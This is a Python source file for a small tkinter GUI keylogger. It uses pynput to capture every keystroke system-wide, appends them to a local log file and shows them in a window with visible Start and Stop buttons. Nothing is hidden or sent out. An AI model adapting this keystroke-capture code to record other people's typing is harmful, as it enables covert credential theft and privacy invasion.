# keylogger_project/keylogger_app.py
import tkinter as tk
from pynput import keyboard

class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger App")

        self.label = tk.Label(master, text="Press 'Start' to begin logging.")
        self.label.pack()

        self.start_button = tk.Button(master, text="Start", command=self.start_logging)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack()

        self.textbox = tk.Text(master, height=10, width=40)
        self.textbox.pack()

        self.listener = None
        self.log_file = "logs/keylog.txt"
        self.logging = False

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as log_file:
                log_file.write(f"{key.char}")
                self.textbox.insert(tk.END, key.char)
        except AttributeError:
            with open(self.log_file, "a") as log_file:
                log_file.write(f" {key} ")
                self.textbox.insert(tk.END, f" {key} ")

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.label.config(text="Logging started. Press 'Stop' to end logging.")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.logging = True

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener.join()
        self.label.config(text="Logging stopped.")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.logging = False

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
